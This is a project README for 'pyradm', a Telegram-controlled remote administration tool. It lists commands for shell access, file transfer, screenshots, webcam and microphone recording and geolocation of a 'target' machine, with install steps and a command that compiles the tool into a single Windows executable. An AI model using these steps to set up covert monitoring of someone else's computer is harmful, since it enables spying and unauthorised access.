## 🔮 pyradm
> Remote administration crossplatfrom tool via telegram\
> Coded with ❤️ **python3** + **aiogram3**\
> https://t.me/pt_soft

## 💻 v0.3
- [X] Screenshot from target
- [X] Crossplatform
- [X] Upload/Download
- [X] Fully compatible shell
- [X] Process list
- [X] Webcam (video record or screenshot)
- [X] Geolocation
- [X] Filemanager
- [X] Microphone

## ⚙️ Functional

```
/start - start pyradm
/help - help
/shell - shell commands
/sc - screenshot
/download - download (abs. path)
/info - system info
/ip - public ip address and geolocation
/ps - process list
/webcam 5 - record video (secs)
/webcam - screenshot from camera
/fm - filemanager
/fm /home or /fm C:\
/mic 10 - record audio from mic
Press button to download file
Send any file as file for upload to target
```

## 📘 Install
* `git clone https://github.com/akhomlyuk/pyradm.git`
* `cd pyradm`
* `pip3 install -r requirements.txt`
* `Put bot token to cfg.py, ask @Bothfather`
* `python3 main.py`

## 🚥 Compile
* `Put bot token to cfg.py`
* `pip install nuitka`
* `nuitka --mingw64 --onefile --follow-imports --remove-output -o pyradm.exe main.py`

## 📷 Screens
![pyadm.png](static/pyadm.png)
![mobile.png](static/mobile.png)
![shell.png](static/shell.png)
![webcam.png](static/webcam.png)
![map.png](static/map.png)
![fileman.png](static/fileman.png)

[![HitCount](https://hits.dwyl.com/akhomlyuk/pyradm.svg?style=flat-square)](http://hits.dwyl.com/akhomlyuk/pyradm)